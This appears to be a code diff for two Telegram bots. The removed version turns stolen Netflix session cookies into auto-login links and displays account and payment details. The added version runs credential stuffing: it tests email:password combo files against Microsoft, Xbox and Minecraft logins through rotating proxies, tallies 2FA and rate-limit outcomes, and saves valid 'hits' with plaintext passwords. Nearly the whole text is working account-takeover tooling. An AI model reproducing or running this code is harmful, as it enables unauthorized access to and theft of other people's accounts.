-        login_pc = f"https://netflix.com/?nftoken={tok_safe}"
-        login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
-    else:
-        login_pc = "https://www.netflix.com/browse"
-        login_phone = "https://www.netflix.com/browse"
-        
-    login_tv = "https://www.netflix.com/tv2"
-
-    return {
-        "email": email or "N/A",
-        "name": name or (profiles_clean[0] if profiles_clean else "N/A"),
-        "country_code": cc,
-        "country": _country(cc),
-        "plan": plan or "N/A",
-        "price": price or "N/A",
-        "member_since": since or "N/A",
-        "next_billing": nextbill or "N/A",
-        "free_trial": free_trial,
-        "video_quality": quality,
-        "max_streams": str(streams),
-        "extra_slots": extra_slots,
-        "card_brand": card_brand or "N/A",
-        "card_last4": card_last4 or "N/A",
-        "payment_method": pay_type or "N/A",
-        "phone": phone,
-        "phone_verified": phone_verified,
-        "profiles": profiles_clean,
-        "profile_count": len(profiles_clean),
-        "netflix_id_raw": netflix_id_raw,
-        "login_pc": login_pc,
-        "login_phone": login_phone,
-        "login_tv": login_tv,
+def check_account_combo(email: str, password: str, user_id: int = None) -> dict:
+    result = {
+        "success": False,
+        "type": "bad",
+        "email": email,
+        "password": password,
+        "gamertag": "N/A",
+        "tier": "N/A",
+        "name": "Not Set",
+        "uuid": "N/A",
+        "capes": "None",
+        "subscriptions": "None",
+        "error": None
     }
 
-# ==================== TELEGRAM BOT INTERFACE ====================
-
-def get_main_menu(user_id):
-    is_admin = user_id in ADMIN_IDS
-    keyboard = [
-        [InlineKeyboardButton("🍪 Check Netflix Cookie", callback_data="check_prompt")],
-        [InlineKeyboardButton("📊 My Account Status", callback_data="check_status"), InlineKeyboardButton("📖 Guide", callback_data="guide")]
-    ]
-    if is_admin:
-        keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
-    return InlineKeyboardMarkup(keyboard)
-
-def get_join_menu():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK)],
-        [InlineKeyboardButton("👥 Join Group", url=GROUP_LINK)],
-        [InlineKeyboardButton("🔄 Check Memberships", callback_data="check_membership")]
-    ])
-
-async def set_bot_commands(application):
-    commands = [
-        BotCommand("start", "Open main menu"),
-        BotCommand("stats", "Check total bot statistics"),
-        BotCommand("admin", "Open admin panel (Admin only)")
-    ]
-    await application.bot.set_my_commands(commands)
-
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    db_query("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user.id, user.username or "Unknown"))
-
-    is_ch, is_gp = await check_memberships(context.bot, user.id)
-    if not is_ch or not is_gp:
-        join_text = (
-            "🔒 **Channel & Group Subscription Required!**\n\n"
-            f"To use this bot, you must join both our official channel and group first:\n"
-            f"• Channel: {REQUIRED_CHANNEL}\n"
-            f"• Group: {REQUIRED_GROUP}\n\n"
-            "Click the buttons below to join, then click **Check Memberships**."
-        )
-        if update.message:
-            await update.message.reply_text(join_text, parse_mode="Markdown", reply_markup=get_join_menu())
-        elif update.callback_query:
-            await update.callback_query.message.edit_text(join_text, parse_mode="Markdown", reply_markup=get_join_menu())
-        return
-
-    welcome_text = (
-        "🌟 **Welcome to Kudasai Netflix Tokenizer Bot!** 🌟\n\n"
-        "Convert Netscape cookies into instant auto-login tokens for **PC**, **Phone**, and **TV**.\n\n"
-        f"👑 **Developer:** {OWNER_HANDLE}"
-    )
-
-    if update.message:
-        await update.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=get_main_menu(user.id))
-    elif update.callback_query:
-        await update.callback_query.message.edit_text(welcome_text, parse_mode="Markdown", reply_markup=get_main_menu(user.id))
-
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    data = query.data
-
-    db_query("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, query.from_user.username or "Unknown"))
-
-    if data == "check_membership":
-        is_ch, is_gp = await check_memberships(context.bot, user_id)
-        if not is_ch or not is_gp:
-            await query.answer("❌ You have not joined both the channel and group yet!", show_alert=True)
-            return
-        await query.answer("✅ Memberships verified successfully!", show_alert=False)
-        await start_command(update, context)
-        return
-
-    is_ch, is_gp = await check_memberships(context.bot, user_id)
-    if not is_ch or not is_gp:
-        join_text = (
-            "🔒 **Channel & Group Subscription Required!**\n\n"
-            f"Please join both our channel ({REQUIRED_CHANNEL}) and group ({REQUIRED_GROUP}) first."
-        )
-        await query.message.edit_text(join_text, parse_mode="Markdown", reply_markup=get_join_menu())
-        return
-
-    if data == "main_menu":
-        await start_command(update, context)
-    elif data == "check_prompt":
-        await query.message.edit_text(
-            "🍪 **Send Netflix Cookies**\n\n"
-            "Please paste your Netscape cookies or cookie text directly in the chat now:",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")]]))
-    elif data == "check_status":
-        user_data = db_query("SELECT checks_count FROM users WHERE user_id=?", (user_id,), "one")
-        total = user_data["checks_count"] if user_data else 0
-        total_users = len(db_query("SELECT user_id FROM users", fetch="all"))
-
-        await query.message.edit_text(
-            f"📊 **Your Account Status:**\n\n"
-            f"• Telegram ID: `{user_id}`\n"
-            f"• Total Checks Performed: `{total}`\n"
-            f"• Total Bot Users: `{total_users} users`\n"
-            f"• Queue Status: Active (Admin Bypass Enabled)",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
-    elif data == "guide":
-        guide_msg = (
-            "📖 **User Guide:**\n\n"
-            "1. Click **Check Netflix Cookie** and paste your Netscape cookies.\n"
-            "2. If the server is busy, your request will enter a seamless queue.\n"
-            "3. Get instant account metrics and auto-login links for **PC**, **Phone**, and **TV**!\n\n"
-            f"👑 Owner: {OWNER_HANDLE}"
-        )
-        await query.message.edit_text(guide_msg, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
-    elif data == "admin_panel":
-        if user_id not in ADMIN_IDS: return
-        users_count = len(db_query("SELECT user_id FROM users", fetch="all"))
-        
-        await query.message.edit_text(
-            f"⚙️ **ADMIN CONTROL PANEL**\n\n"
-            f"• Total Registered Users: `{users_count}`\n"
-            f"• Active Semaphore Limit: `3 concurrent checks`\n"
-            f"• Status: Queue enabled, Admins bypass queue.",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]]))
-
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    text = update.message.text
-    if not text or text.startswith("/"):
-        return
-
-    db_query("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user.id, user.username or "Unknown"))
-
-    is_ch, is_gp = await check_memberships(context.bot, user.id)
-    if not is_ch or not is_gp:
-        await update.message.reply_text(
-            "🔒 **Channel & Group Subscription Required!**\n\n"
-            f"Please join both our channel ({REQUIRED_CHANNEL}) and group ({REQUIRED_GROUP}) first before using the bot.",
-            parse_mode="Markdown",
-            reply_markup=get_join_menu()
-        )
-        return
-
-    is_admin = user.id in ADMIN_IDS
-    status_msg = await update.message.reply_text("⏳ <i>Processing cookies in queue...</i>", parse_mode="HTML")
-
     try:
-        cookies = load_cookies(text)
-        if not cookies or not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
-            await status_msg.edit_text("❌ <b>Error:</b> Could not detect valid Netflix cookies (`NetflixId` / `SecureNetflixId`).", parse_mode="HTML")
-            return
-
-        # Queue handling: Admins skip the semaphore limit completely!
-        if is_admin:
-            acc = await asyncio.to_thread(check_account, cookies, 20)
+        session = requests.Session()
+        session.verify = False
+        
+        if user_id:
+            session.proxies = get_user_proxy(user_id)
         else:
-            async with CHECK_SEMAPHORE:
-                await status_msg.edit_text("🔄 <i>Your request has left the queue and is now checking...</i>", parse_mode="HTML")
-                acc = await asyncio.to_thread(check_account, cookies, 20)
+            session.proxies = None
 
-        if not acc:
-            await status_msg.edit_text("❌ <b>Error:</b> Account is dead, logged out, or cookies are expired/invalid.", parse_mode="HTML")
-            return
+        url_post, sftag = get_sftag(session)
+        if not url_post or not sftag:
+            result["type"] = "error"
+            result["error"] = "Failed to get SFTag (Possible IP Block)"
+            return result
 
-        db_query("UPDATE users SET checks_count = checks_count + 1 WHERE user_id=?", (user.id,))
+        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
 
-        cc = acc.get("country_code", "XX")
-        flag = _flag(cc)
-        p = acc.get("profiles", [])
-        profs = ", ".join(p[:4]) if p else "N/A"
-        pv = "✅" if acc.get("phone_verified") else "❌"
-        nf_id = acc.get("netflix_id_raw", "")
+        if auth_status == "ratelimit":
+            result["type"] = "ratelimit"
+            result["error"] = "IP Rate Limited by Microsoft!"
+            return result
+        elif auth_status == "2fa":
+            result["type"] = "2fa"
+            result["error"] = "2FA Required"
+            return result
+        elif auth_status == "bad":
+            result["type"] = "bad"
+            result["error"] = "Invalid credentials"
+            return result
+        elif auth_status != "success" or not ms_token:
+            result["type"] = "error"
+            result["error"] = "Authentication failed"
+            return result
 
-        caption = (
-            f"🎬 <b>NETFLIX ACCOUNT CHECKED</b>\n\n"
-            f"👤 <b>{acc['name']}</b>\n"
-            f"📧 <code>{acc['email']}</code>\n"
-            f"🌍 {acc['country']} {flag} ({cc})\n\n"
-            f"📋 <b>{acc['plan']}</b>  •  💰 {acc['price']}\n"
-            f"📅 Since: {acc['member_since']}\n"
-            f"🗓 Billing: {acc['next_billing']}\n"
-            f"🎁 Free Trial: {'Yes' if acc['free_trial'] else 'No'}\n\n"
-            f"🎥 {acc['video_quality']}  |  📺 {acc['max_streams']} streams  |  ➕ {acc['extra_slots']} extra\n"
-            f"💳 {acc['card_brand']} *{acc['card_last4']}  •  {acc['payment_method']}\n"
-            f"📞 {acc['phone']}  {pv}\n"
-            f"👥 Profiles ({acc['profile_count']}): {profs}\n\n"
-            f"🍪 <b>Cookie Snippet</b>\n"
-            f"<code>NetflixId={nf_id[:30]}...</code>\n\n"
-            f"──────────────────\n"
-            f"👑 <b>Developer:</b> {OWNER_HANDLE}\n"
-            f"🤖 <b>Bot:</b> {BOT_HANDLE}"
-        )
+        xbox_token, uhs = get_xbox_token(session, ms_token)
+        if not xbox_token or not uhs:
+            result["type"] = "bad"
+            result["error"] = "Xbox token failed"
+            return result
 
-        buttons = []
-        row1 = []
-        if acc.get("login_pc") and acc["login_pc"] != "N/A":
-            row1.append(InlineKeyboardButton("🖥 Click to PC", url=acc["login_pc"]))
-        if acc.get("login_phone") and acc["login_phone"] != "N/A":
-            row1.append(InlineKeyboardButton("📱 Click to Phone", url=acc["login_phone"]))
-        if row1:
-            buttons.append(row1)
-        buttons.append([InlineKeyboardButton("📺 Click to TV", url=acc["login_tv"])])
+        xsts_token = get_xsts_token(session, xbox_token)
+        if not xsts_token:
+            result["type"] = "bad"
+            result["error"] = "XSTS token failed"
+            return result
 
-        reply_markup = InlineKeyboardMarkup(buttons)
-        await status_msg.edit_text(caption, parse_mode="HTML", reply_markup=reply_markup)
+        xbox_profile = get_xbox_profile(session, uhs, xsts_token)
+        result["gamertag"] = xbox_profile.get("gamertag", "N/A")
+        result["tier"] = xbox_profile.get("tier", "N/A")
+
+        mc_token = get_minecraft_token(session, uhs, xsts_token)
+        if not mc_token:
+            result["type"] = "bad"
+            result["error"] = "Minecraft token failed"
+            return result
+
+        account_type, subs = check_entitlements(session, mc_token)
+        if not account_type:
+            result["success"] = False
+            result["type"] = "not_linked"
+            result["error"] = "Unlinked account"
+            return result
+
+        result["subscriptions"] = ", ".join(subs) if subs else "None"
+        result["type"] = account_type
+
+        profile = get_profile(session, mc_token)
+        if profile and "id" in profile:
+            result["name"] = profile.get('name', 'Not Set')
+            result["uuid"] = profile.get('id', 'N/A')
+            result["capes"] = ", ".join([c["alias"] for c in profile.get("capes", [])])
+            if not result["capes"]:
+                result["capes"] = "None"
+        
+        result["success"] = True
+        return result
 
     except Exception as e:
-        print(f"[DEBUG] Checker Exception: {e}")
-        await status_msg.edit_text(f"❌ <b>An error occurred:</b> <code>{str(e)}</code>", parse_mode="HTML")
+        result["type"] = "error"
+        result["error"] = str(e)
+        return result
+    finally:
+        try:
+            session.close()
+        except:
+            pass
 
-def main():
-    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).post_init(set_bot_commands).build()
+# ══════════════════════════════════════════════
+# TELEGRAM BOT
+bot = Bot(token=BOT_TOKEN)
+dp = Dispatcher()
 
-    app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("stats", lambda u, c: c.bot.send_message(u.effective_chat.id, f"📊 Total Bot Users: {len(db_query('SELECT user_id FROM users', fetch='all'))}")))
-    app.add_handler(CommandHandler("admin", lambda u, c: u.message.reply_text("Admin Panel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⚙️ Open Admin Control", callback_data="admin_panel")]]))))
-    app.add_handler(CallbackQueryHandler(button_callback))
-    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
+# COMPLETE EMOJI DICTIONARY - RESTORED
+EMOJIS = {
+    "success": "✅",
+    "error": "❌",
+    "warning": "⚠️",
+    "info": "ℹ️",
+    "loading": "⏳",
+    "processing": "🔄",
+    "done": "🎯",
+    "waiting": "⏰",
+    "clock": "⏰",
+    "ultimate": "👑",
+    "gamepass": "🎮",
+    "minecraft": "⛏️",
+    "xbox": "🕹️",
+    "notlinked": "🔓",
+    "bad": "❌",
+    "twofa": "🔐",
+    "hit": "💎",
+    "check": "🔍",
+    "file": "📁",
+    "stats": "📊",
+    "about": "ℹ️",
+    "owner": "👑",
+    "queue": "📋",
+    "back": "🔙",
+    "menu": "📋",
+    "settings": "⚙️",
+    "admin": "🛡️",
+    "proxy": "🌐",
+    "http": "🌍",
+    "socks4": "🔷",
+    "socks5": "🔶",
+    "none": "🚫",
+    "scrape": "🔄",
+    "load": "📂",
+    "status": "📊",
+    "key": "🔑",
+    "access": "🔓",
+    "locked": "🔒",
+    "protected": "🛡️",
+    "user": "👤",
+    "users": "👥",
+    "admin_user": "👑",
+    "calendar": "📅",
+    "star": "⭐",
+    "gift": "🎁",
+    "fire": "🔥",
+    "rocket": "🚀",
+    "target": "🎯",
+    "trophy": "🏆",
+    "medal": "🥇",
+    "gem": "💎",
+    "thunder": "⚡",
+    "pencil": "✏️",
+    "link": "🔗",
+    "channel": "📢",
+    "server": "🖥️",
+    "database": "💾",
+    "network": "🌐",
+    "speed": "🚄",
+    "power": "💪",
+}
 
-    print("[+] Kudasai Keyless Netflix Bot is online with Queue & User Tracking!")
-    app.run_polling()
+def get_main_keyboard(user_id: int) -> ReplyKeyboardMarkup:
+    user = db.get_user(user_id)
+    proxy_type = user.get("proxy_type", "none")
+    proxy_count = len(user.get("proxies", []))
+    
+    if proxy_type != "none" and proxy_count > 0:
+        proxy_indicator = f"🌐 {proxy_type.upper()} ({proxy_count})"
+    else:
+        proxy_indicator = "🚫 No Proxy"
+    
+    keyboard = ReplyKeyboardMarkup(
+        keyboard=[
+            [
+                KeyboardButton(text=f"{EMOJIS['check']} Check Account"),
+                KeyboardButton(text=f"{EMOJIS['file']} Check File")
+            ],
+            [
+                KeyboardButton(text=f"{EMOJIS['stats']} My Stats"),
+                KeyboardButton(text=f"{EMOJIS['about']} About Bot")
+            ],
+            [
+                KeyboardButton(text=f"{EMOJIS['owner']} Owner"),
+                KeyboardButton(text=f"{EMOJIS['queue']} Queue Status")
+            ],
+            [
+                KeyboardButton(text=f"{EMOJIS['proxy']} Proxy Settings"),
+                KeyboardButton(text=f"{EMOJIS['scrape']} Scrape Proxies")
+            ],
+            [
+                KeyboardButton(text=f"📊 {proxy_indicator}")
+            ]
+        ],
+        resize_keyboard=True,
+        input_field_placeholder="Choose an option..."
+    )
+    
+    if is_admin(user_id):
+        keyboard.keyboard.append([
+            KeyboardButton(text=f"{EMOJIS['admin']} Admin Panel")
+        ])
+    
+    return keyboard
+
+def get_inline_menu() -> InlineKeyboardMarkup:
+    builder = InlineKeyboardBuilder()
+    builder.button(text=f"{EMOJIS['check']} Check", callback_data="menu_check")
+    builder.button(text=f"{EMOJIS['file']} File", callback_data="menu_file")
+    builder.button(text=f"{EMOJIS['stats']} Stats", callback_data="menu_stats")
+    builder.button(text=f"{EMOJIS['about']} Help", callback_data="menu_help")
+    builder.button(text=f"{EMOJIS['owner']} Owner", callback_data="menu_owner")
+    builder.button(text=f"{EMOJIS['queue']} Queue", callback_data="menu_queue")
+    builder.adjust(2)
+    return builder.as_markup()
+
+def get_admin_inline_menu() -> InlineKeyboardMarkup:
+    builder = InlineKeyboardBuilder()
+    builder.button(text=f"{EMOJIS['stats']} Bot Stats", callback_data="admin_stats")
+    builder.button(text=f"{EMOJIS['users']} Users List", callback_data="admin_users")
+    builder.button(text=f"{EMOJIS['queue']} Queue Status", callback_data="admin_queue")
+    builder.button(text=f"{EMOJIS['back']} Back", callback_data="menu_back")
+    builder.adjust(2)
+    return builder.as_markup()
+
+def get_user_proxy_keyboard(user_id: int) -> ReplyKeyboardMarkup:
+    user = db.get_user(user_id)
+    current_type = user.get("proxy_type", "none")
+    
+    http_mark = " ✅" if current_type == "http" else ""
+    socks4_mark = " ✅" if current_type == "socks4" else ""
+    socks5_mark = " ✅" if current_type == "socks5" else ""
+    none_mark = " ✅" if current_type == "none" else ""
+    
+    keyboard = ReplyKeyboardMarkup(
+        keyboard=[
+            [
+                KeyboardButton(text=f"{EMOJIS['http']} HTTP{http_mark}"),
+                KeyboardButton(text=f"{EMOJIS['socks4']} SOCKS4{socks4_mark}"),
+                KeyboardButton(text=f"{EMOJIS['socks5']} SOCKS5{socks5_mark}")
+            ],
+            [
+                KeyboardButton(text=f"{EMOJIS['none']} None{none_mark}"),
+                KeyboardButton(text=f"{EMOJIS['load']} Load Proxies"),
+                KeyboardButton(text=f"{EMOJIS['scrape']} Scrape Proxies")
+            ],
+            [
+                KeyboardButton(text=f"{EMOJIS['status']} My Proxy Status"),
+                KeyboardButton(text=f"{EMOJIS['back']} Back to Menu")
+            ]
+        ],
+        resize_keyboard=True
+    )
+    return keyboard
+
+def save_hit_to_file(result: dict):
+    category_map = {
+        "Xbox Game Pass Ultimate": "gamepass",
+        "Xbox Game Pass": "gamepass",
+        "Minecraft": "minecraft",
+        "Xbox": "xbox",
+        "Xbox: Bedrock": "xbox"
+    }
+    folder_map = {
+        "gamepass": "GamePass",
+        "minecraft": "Minecraft",
+        "xbox": "Xbox"
+    }
+    
+    category = category_map.get(result["type"], "xbox")
+    folder = folder_map.get(category, "Xbox")
+    
+    os.makedirs(f"Results/{folder}", exist_ok=True)
+    
+    capture = (
+        f"Email         : {result['email']}\n"
+        f"Password      : {result['password']}\n"
+        f"Xbox Gamertag : {result.get('gamertag', 'N/A')}\n"
+        f"Tier          : {result.get('tier', 'N/A')}\n"
+        f"Minecraft Name: {result.get('name', 'Not Set')}\n"
+        f"UUID          : {result.get('uuid', 'N/A')}\n"
+        f"Capes         : {result.get('capes', 'None')}\n"
+        f"Type          : {result['type']}\n"
+        f"Subscriptions : {result['subscriptions']}\n"
+        f"Captured By   : {MY_SIGNATURE}\n"
+        f"{'='*50}"
+    )
+    
+    with open(f"Results/{folder}/{category}_hits.txt", "a", encoding="utf-8") as f:
+        f.write(capture + "\n")
+
+async def download_file_safely(file_id: str, file_name: str) -> Optional[str]:
+    max_attempts = 3
+    file_path = f"data/temp_{file_name}"
+    for attempt in range(max_attempts):
+        try:
+            file = await bot.get_file(file_id)
+            await bot.download_file(file.file_path, file_path)
+            if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+                return file_path
+            if os.path.exists(file_path):
+                os.remove(file_path)
+        except Exception:
+            if attempt == max_attempts - 1:
+                return None
+            await asyncio.sleep(1)
+    return None
+
+def format_check_result(result: dict) -> str:
+    if not result["success"]:
+        if result["type"] == "ratelimit":
+            return f"⚠️ <b>{result['email']}</b>\n└ Microsoft Rate Limit Blocked IP"
+        emoji = EMOJIS["error"] if result["type"] == "bad" else EMOJIS["warning"]
+        return f"{emoji} <b>{result['email']}</b>\n└ {result['error'] or result['type']}"
+
+    emoji_map = {
+        "Xbox Game Pass Ultimate": EMOJIS["ultimate"],
+        "Xbox Game Pass": EMOJIS["gamepass"],
+        "Minecraft": EMOJIS["minecraft"],
+        "Xbox": EMOJIS["xbox"]
+    }
+    emoji = emoji_map.get(result["type"], EMOJIS["hit"])
+
+    return f"""💎 🎯 <b>HIT FOUND!</b>
+╔════════════════════════════════
+║ 👤 <b>Email:</b> <code>{result['email']}</code>
+║ 🔑 <b>Password:</b> <code>{result['password']}</code>
+╠════════════════════════════════
+║ 🕹️ <b>Xbox Gamertag:</b> {result.get('gamertag', 'N/A')}
+║ 🏆 <b>Tier:</b> {result.get('tier', 'N/A')}
+║ ⛏️ <b>Minecraft Name:</b> {result.get('name', 'Not Set')}
+║ 💎 <b>UUID:</b> <code>{result.get('uuid', 'N/A')}</code>
+║ ⭐ <b>Capes:</b> {result.get('capes', 'None')}
+╠════════════════════════════════
+║ 🎯 <b>Type:</b> {result['type']}
+║ 🎁 <b>Subscriptions:</b> {result['subscriptions']}
+╚════════════════════════════════
+👑 <b>Captured By:</b> {MY_SIGNATURE}"""
+
+# ══════════════════════════════════════════════
+# QUEUE PROCESSOR
+async def process_queue():
+    while True:
+        try:
+            task = check_queue.get_next_task()
+            if task:
+                user_id = task['user_id']
+                task_type = task['task_type']
+                data = task['data']
+                message = task.get('message_obj')
+                
+                if task_type == 'single_check':
+                    await process_single_check(user_id, data, message)
+                elif task_type == 'file_check':
+                    await process_file_check(user_id, data, message)
+                
+                check_queue.complete_task(user_id)
+            else:
+                await asyncio.sleep(1)
+        except Exception as e:
+            print(f"Queue processing error: {e}")
+            await asyncio.sleep(1)
+
+async def process_single_check(user_id: int, data: dict, message):
+    email = data['email']
+    password = data['password']
+    
+    msg = await message.answer(f"{EMOJIS['processing']} <b>Checking:</b> <code>{email}:{password}</code>...", parse_mode="HTML")
+    result = await asyncio.to_thread(check_account_combo, email, password, user_id)
+    
+    if result["success"]:
+        db.update_user(user_id, {"hits": db.get_user(user_id).get("hits", 0) + 1})
+        db.add_hit(result)
+        save_hit_to_file(result)
+        await msg.edit_text(format_check_result(result), parse_mode="HTML")
+        db.use_check(user_id)
+        user = db.get_user(user_id)
+        await message.answer(
+            f"{EMOJIS['stats']} <b>Total Checks:</b> {user.get('total_checks', 0)} | 🎯 <b>Hits:</b> {user.get('hits', 0)}",
+            parse_mode="HTML"
+        )
+    else:
+        await msg.edit_text(format_check_result(result), parse_mode="HTML")
+        db.use_check(user_id)
+    
+    await message.answer(
+        f"{EMOJIS['processing']} <b>Send another account or return to menu:</b>",
+        reply_markup=get_main_keyboard(user_id),
+        parse_mode="HTML"
+    )
+
+async def process_file_check(user_id: int, data: dict, message):
+    file_path = data['file_path']
+    try:
+        if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
+            await message.answer(f"{EMOJIS['error']} File not found or empty!")
+            if os.path.exists(file_path):
+                os.remove(file_path)
+            return
+        
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            combos = [line.strip() for line in f if line.strip() and ':' in line]
+        
+        if not combos:
+            await message.answer(f"{EMOJIS['error']} No valid combos found in file!")
+            os.remove(file_path)
+            return
+        
+        total = len(combos)
+        progress_msg = await message.answer(f"{EMOJIS['processing']} <b>Checking {total} accounts...</b>\n\n0/{total} done", parse_mode="HTML")
+        
+        results = {"hits": [], "bad": 0, "2fa": 0, "ratelimit": 0, "errors": 0}
+        checked = 0
+        
+        for combo in combos:
+            email, password = combo.split(":", 1)
+            
+            result = await asyncio.to_thread(check_account_combo, email, password, user_id)
+            
+            if result["success"]:
+                results["hits"].append(result)
+                db.update_user(user_id, {"hits": db.get_user(user_id).get("hits", 0) + 1})
+                db.add_hit(result)
+                save_hit_to_file(result)
+                await message.answer(format_check_result(result), parse_mode="HTML")
+            elif result["type"] == "bad":
+                results["bad"] += 1
+            elif result["type"] == "2fa":
+                results["2fa"] += 1
+            elif result["type"] == "ratelimit":
+                results["ratelimit"] += 1
+            else:
+                results["errors"] += 1
+            
+            checked += 1
+            db.use_check(user_id)
+            
+            if checked % 5 == 0 or checked == total:
+                user = db.get_user(user_id)
+                try:
+                    await progress_msg.edit_text(
+                        f"{EMOJIS['processing']} <b>Checking File ({checked}/{total})...</b>\n"
+                        f"🔍 <b>Last Checked:</b> <code>{email}:{password}</code>\n\n"
+                        f"🎯 Hits: {len(results['hits'])}\n"
+                        f"{EMOJIS['error']} Bad/Dead: {results['bad']}\n"
+                        f"⚠️ Rate Limits: {results['ratelimit']}\n"
+                        f"{EMOJIS['twofa']} 2FA: {results['2fa']}\n"
+                        f"{EMOJIS['warning']} Errors: {results['errors']}\n"
+                        f"{EMOJIS['stats']} Total Checks: {user.get('total_checks', 0)}",
+                        parse_mode="HTML"
+                    )
+                except Exception:
+                    pass
+        
+        await message.answer(
+            f"{EMOJIS['success']} <b>File Check Complete!</b>\n\n"
+            f"{EMOJIS['stats']} Total: {checked}/{total}\n"
+            f"🎯 Hits: {len(results['hits'])}\n"
+            f"{EMOJIS['error']} Bad: {results['bad']}\n"
+            f"⚠️ Rate Limits: {results['ratelimit']}\n"
+            f"{EMOJIS['twofa']} 2FA: {results['2fa']}\n"
+            f"{EMOJIS['warning']} Errors: {results['errors']}",
+            parse_mode="HTML"
+        )
+        if os.path.exists(file_path):
+            os.remove(file_path)
+    except Exception as e:
+        await message.answer(f"{EMOJIS['error']} Error processing file: {str(e)}")
+        if os.path.exists(file_path):
+            os.remove(file_path)
+    
+    await message.answer(
+        f"{EMOJIS['processing']} <b>Return to menu:</b>",
+        reply_markup=get_main_keyboard(user_id),
+        parse_mode="HTML"
+    )
+
+# ══════════════════════════════════════════════
+# BOT HANDLERS
+@dp.message(Command("start"))
+async def cmd_start(message: types.Message):
+    user_id = message.from_user.id
+    user = db.get_user(user_id)
+    db.update_user(user_id, {
+        "username": message.from_user.username,
+        "first_name": message.from_user.first_name
+    })
+    
+    access_text = f"{EMOJIS['success']} Free & Unlimited Access"
+    admin_tag = f" {EMOJIS['admin_user']} ADMIN" if is_admin(user_id) else ""
+    user_proxy_type = user.get("proxy_type", "none")
+    user_proxy_count = len(user.get("proxies", []))
+    proxy_info = f"{EMOJIS['proxy']} Proxy: {user_proxy_type.upper() if user_proxy_type != 'none' else 'None'} | {user_proxy_count} loaded"
+    
+    welcome_text = f"""🌟 <b>Welcome to {BOT_NAME}!</b>{admin_tag}
+╔════════════════════════════════
+║ {EMOJIS['xbox']} Xbox Account Checker
+║ {EMOJIS['info']} Version: {BOT_VERSION}
+║ {EMOJIS['owner']} Owner: {OWNER_USERNAME}
+╠════════════════════════════════
+║ {EMOJIS['access']} <b>Access:</b> {access_text}
+║ {EMOJIS['stats']} <b>Total Checks:</b> {user.get('total_checks', 0)}
+║ 🎯 <b>Hits Found:</b> {user.get('hits', 0)}
+║ {proxy_info}
+╚════════════════════════════════
+
+{EMOJIS['queue']} <b>Queue System:</b> All checks go through queue
+{EMOJIS['admin_user']} <b>Admins get priority</b> - Always at front!
+{EMOJIS['proxy']} <b>Proxy System:</b> Each user has their OWN proxy settings!
+
+Use the buttons below to get started!"""
+
+    await message.answer(welcome_text, reply_markup=get_main_keyboard(user_id), parse_mode="HTML")
+    await message.answer(f"{EMOJIS['menu']} <b>Quick Menu:</b>", reply_markup=get_inline_menu(), parse_mode="HTML")
+
+@dp.message(Command("admin"))
+async def cmd_admin(message: types.Message):
+    if not is_admin(message.from_user.id):
+        await message.answer(f"{EMOJIS['error']} <b>Unauthorized!</b>", parse_mode="HTML")
+        return
+    await message.answer(f"{EMOJIS['admin']} <b>Admin Panel</b>\n\nSelect an option:", reply_markup=get_admin_inline_menu(), parse_mode="HTML")
+
+@dp.message(Command("getid"))
+async def cmd_getid(message: types.Message):
+    if message.reply_to_message:
+        await message.answer(f"User ID: <code>{message.reply_to_message.from_user.id}</code>", parse_mode="HTML")
+    else:
+        await message.answer(f"Your ID: <code>{message.from_user.id}</code>", parse_mode="HTML")
+
+@dp.message(F.text == f"{EMOJIS['queue']} Queue Status")
+async def menu_queue_status(message: types.Message):
+    user_id = message.from_user.id
+    status = check_queue.get_queue_status()
+    position = check_queue.get_queue_position(user_id)
+    text = f"{EMOJIS['queue']} <b>Queue Status</b>\nTotal Pending: {status['total']}\nYour Position: {position if position else 'None'}"
+    await message.answer(text, reply_markup=get_main_keyboard(user_id), parse_mode="HTML")
+
+@dp.message(F.text == f"{EMOJIS['check']} Check Account")
+async def menu_check_account(message: types.Message):
+    await message.answer(f"{EMOJIS['check']} <b>Send account in format:</b>\n<code>email:password</code>", parse_mode="HTML")
+
+@dp.message(F.text & F.text.contains(":") & (~F.text.startswith("/")))
+async def handle_single_check(message: types.Message):
+    user_id = message.from_user.id
+    parts = message.text.strip().split(":", 1)
+    if len(parts) != 2:
+        return
+    
+    email, password = parts
+    position = check_queue.get_queue_position(user_id)
+    if position is not None:
+        await message.answer(f"{EMOJIS['waiting']} You already have a task in queue!", parse_mode="HTML")
+        return
+    
+    position = check_queue.add_to_queue(user_id, 'single_check', {'email': email, 'password': password}, message)
+    await message.answer(f"{EMOJIS['success']} Added to Queue! Position: #{position + 1}", parse_mode="HTML")
+
+@dp.message(F.text == f"{EMOJIS['file']} Check File")
+async def menu_check_file(message: types.Message):
+    await message.answer("Send a .txt file with combos (`email:password`).", parse_mode="HTML")
+
+@dp.message(F.document & F.document.file_name.endswith(".txt"))
+async def handle_file_check(message: types.Message):
